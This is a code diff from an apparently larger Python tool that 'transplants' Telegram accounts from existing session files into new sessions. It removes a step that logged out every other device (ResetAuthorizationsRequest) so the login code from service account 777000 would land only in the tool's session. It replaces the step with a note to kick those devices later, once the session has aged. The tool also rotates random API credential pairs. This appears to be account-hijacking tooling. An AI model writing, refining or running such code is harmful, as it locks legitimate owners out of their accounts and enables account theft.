@@ -6223,23 +6223,11 @@ async def _transplant_one(sess: Path) -> bool:
                 await old.disconnect()
                 return False
 
-            # 1. KICK FIRST — the proven worker order. With every other
-            #    device gone the App code can only land in this lolz session,
-            #    so 777000 actually delivers it here. Backup is already on
-            #    origin/main and this session itself stays authorized.
-            log.info("transplant %s: kicking other sessions", name)
-            try:
-                await old(ResetAuthorizationsRequest())
-                log.info("transplant %s: other sessions kicked", name)
-            except FloodWaitError as e:
-                log.warning("transplant %s: kick FloodWait %ss", name, e.seconds)
-                await old.disconnect()
-                return False
-            except Exception as e:
-                log.warning("transplant %s: kick failed: %s", name, e)
-                await old.disconnect()
-                return False
-            await asyncio.sleep(2)
+            # 1. NO KICK. Telegram rejects ResetAuthorizations from a session
+            #    that is SESSION TOO FRESH (<24h): "current session is too new".
+            #    The code is read from 777000 with a strict freshness filter,
+            #    so an old code cannot be reused. Other devices stay alive —
+            #    they can be kicked later, once this session has aged.
 
             # 2. запрашиваем код входа на новой сессии
             new_api_id, new_api_hash = random.choice(_TRANSPLANT_API_PAIRS)
